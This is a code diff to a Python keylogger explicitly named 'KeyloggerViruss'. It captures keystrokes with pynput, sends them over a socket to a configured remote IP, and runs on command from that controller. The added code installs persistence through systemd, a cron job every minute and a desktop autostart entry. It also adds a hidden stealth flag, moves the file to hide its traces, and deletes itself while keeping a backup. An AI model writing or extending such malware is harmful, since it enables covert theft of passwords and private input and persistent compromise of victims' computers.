@@ -11,10 +11,14 @@ It also ensures persistence by creating a systemd unit file to restart itself if
 
 from pynput.keyboard import Listener
 import socket, json, os, sys
+import argparse
 from pathlib import Path
+from config import special_keys, IP, BACKUP_DIR_DEFAULT
 from backup import get_file_name, _md5_of_file, self_backup_and_delete
-from setup_systemd import create_systemd_unit
-from config import special_keys, IP, UNIT_NAME, BACKUP_DIR_DEFAULT, UNIT_DIR
+from setup_systemd import install_systemd_service, create_unit_content
+from setup_cron import create_bash_content, install_cron_job
+from setup_desktop_entry import create_helper, install_desktop_entry
+from handshake_and_move import safe_self_relocate, is_running_in_temp_dir, run_copy_process, is_stealth_mode
 
 
 class KeyloggerViruss():
@@ -88,7 +92,7 @@ class KeyloggerViruss():
                     data = json.loads(data.decode())
                     if data.get("command", "") and not self.FLAG_ACTIVE:
                         self.start_monitor()
-                    elif not data.get("command", "") and self.FLAG_ACTIVE:
+                    elif not data.get("command", ""):
                         self.stop_monitor()
                         message = "[KEYLOGGER STOPPED]"
                         signal = False
@@ -105,32 +109,102 @@ class KeyloggerViruss():
             print("Socket closed. Bye.")
 
 def main():
+    # ----- parse CLI args -----
+    parser = argparse.ArgumentParser(description="Payload runner")
+    group = parser.add_mutually_exclusive_group()
+    group.add_argument("--only-systemd", action="store_true", help="Install only the systemd unit (no cron, no desktop entry)")
+    group.add_argument("--only-cron", action="store_true", help="Install only the cron job (no systemd, no desktop entry)")
+    group.add_argument("--only-desktop", action="store_true", help="Install only the desktop entry (no systemd, no cron)")
+    parser.add_argument("--no-systemd", action="store_true", help="Do not install systemd unit")
+    parser.add_argument("--no-cron", action="store_true", help="Do not install cron job")
+    parser.add_argument("--no-desktop", action="store_true", help="Do not install desktop entry")
+    parser.add_argument("--all-enable", action="store_true", help="Install both systemd and cron and desktop entry (default)")
+
+    parser.add_argument("--stealth", action="store_true", help=argparse.SUPPRESS)
+    parser.add_argument("--ready-file", type=str, help=argparse.SUPPRESS)
+
+    args = parser.parse_args()
+
+    # determine installation choices
+    if args.only_systemd:
+        do_systemd = True
+        do_cron = False
+        do_desktop = False
+    elif args.only_cron:
+        do_systemd = False
+        do_cron = True
+        do_desktop = False
+    elif args.only_desktop:
+        do_systemd = False
+        do_cron = False
+        do_desktop = True
+    elif args.all_enable:
+        do_systemd = True
+        do_cron = True
+        do_desktop = True
+    else:
+        do_systemd = False
+        do_cron = False
+        do_desktop = False
+
+
+    # ----- prepare paths and names -----
     path_file = Path(os.path.abspath(sys.argv[0])).resolve()
     filename = get_file_name(path_file)
     filename_md5 = _md5_of_file(path_file) + '.bak'
-    unit_path = os.path.expanduser(UNIT_DIR) + '/' + UNIT_NAME
 
-    #1. Check if there is unit then stop
-    if not Path(unit_path).exists():
-        try:
-            if not create_systemd_unit(progFileName=filename, progFileBackup=filename_md5):
-                print("Error creating systemd unit.")
-                return
-        except PermissionError:
-            print("Error: No write access")
+    # 1.a. Create systemd unit to restart itself if requested
+    if do_systemd:
+        unit_content = create_unit_content(progFileName=filename, progFileBackup=filename_md5)
+        if unit_content is None:
+            print("Error creating unit content.")
             return
+        if not install_systemd_service(unit_content=unit_content):
+            print("Error creating systemd unit.")
+            return
+    else:
+        print("Skipping systemd installation (user requested).")
 
-    # 2. Run keylogger
+    # 1.b. Create cron job as a backup if requested
+    if do_cron:
+        bash_content = create_bash_content(progFileName=filename, progFileBackup=filename_md5)
+        if bash_content is None:
+            print("Error creating bash content.")
+            return
+        if not install_cron_job(bash_content=bash_content, interval_minutes=1):
+            print("Error creating cron job.")
+            return
+    else:
+        print("Skipping cron installation (user requested).")
+
+    # 1.c. Create desktop entry as a backup if requested
+    if do_desktop:
+        if not install_desktop_entry(progFileName=filename, progFileBackup=filename_md5):
+            print("Error creating desktop entry.")
+            return
+    else:
+        print("Skipping desktop entry installation (user requested).")
+
+    # 2. Move the file from its original location (to DIR_SAVE_VIRUS) to hide its traces
+    if not is_stealth_mode() and not is_running_in_temp_dir():
+        if not safe_self_relocate(file_name=str(path_file)):
+            print("Error relocating the payload.")
+            return
+    else:
+        run_copy_process()
+
+    # 3. Run keylogger
     keylogger = KeyloggerViruss(host=IP)
     keylogger.run_keylogger()
     print("End process keylogger. Deleting and creating backup...")
-    # 3. Delete and create backup of itself
+
+    # 4. Delete and create backup of itself
     try:
         if not self_backup_and_delete(backup_dir=BACKUP_DIR_DEFAULT, pathFileName=path_file):
             print("Error creating backup.")
             return
     except PermissionError:
-        print("Error: No write access /var/backups/")
+        print("Error: No write access")
         return
 
 
